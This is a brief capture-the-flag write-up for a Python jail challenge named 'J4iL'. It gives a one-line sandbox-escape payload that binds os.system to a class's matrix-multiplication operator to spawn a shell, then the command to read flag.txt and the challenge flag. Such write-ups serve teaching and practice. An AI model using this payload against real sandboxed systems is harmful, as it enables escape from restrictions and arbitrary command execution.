# J4iL

## Write-up
- You have to open shell ***sh*** using the following inputs:
- `[x:=type('class',(),{}),setattr(x,'__matmul__',__builtins__["__loader__"].load_module("sys").modules['os'].system),x()@'sh']`
- then use `cat flag.txt` to open the flag
## Flag

`shellmates{4RG5_w17H_m47r1x_MUL71PL1C471oN}`
